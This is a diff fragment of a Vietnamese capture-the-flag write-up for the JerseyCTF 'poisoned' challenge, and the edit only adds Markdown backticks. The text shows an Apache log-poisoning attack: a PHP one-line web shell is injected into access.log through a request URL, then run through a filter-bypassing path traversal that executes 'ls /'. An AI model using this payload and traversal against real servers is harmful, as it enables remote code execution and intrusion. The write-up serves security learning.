@@ -68,10 +68,10 @@ sau một hồi Intruder nữa mình tìm thấy log file này: https://jerseyct
 ![img](./images/10.png)
 
 Ta thấy log này lưu trữ các truy cập từ người dùng đúng không. kể cả nãy giờ mình truy cập etc/passwd với access.log nó cũng lưu
-tiếp theo chèn đoạn php sau: <?php system($_GET['poison']);?> bằng cách truy cập link:
-https://jerseyctf-poisoned.chals.io/<?php system($_GET['poison']);?>   để nó được lưu vào access.log
+tiếp theo chèn đoạn php sau: `<?php system($_GET['poison']);?>` bằng cách truy cập link:
+`https://jerseyctf-poisoned.chals.io/<?php system($_GET['poison']);?>`   để nó được lưu vào access.log
 
-cái đoạn /<?php system($_GET['poison']);?>  này cũng sẽ được lưu vào file access.log và điều hay ở chỗ ta có thể thực thi được nó luôn
+cái đoạn /`<?php system($_GET['poison']);?>`  này cũng sẽ được lưu vào file access.log và điều hay ở chỗ ta có thể thực thi được nó luôn
 
 Tiếp theo chỉ cần truy cập: https://jerseyctf-poisoned.chals.io/?page=....//....//....//....//....//....//....//var/log/apache2/access.log&poison=ls%20/ để thực thi mã
 
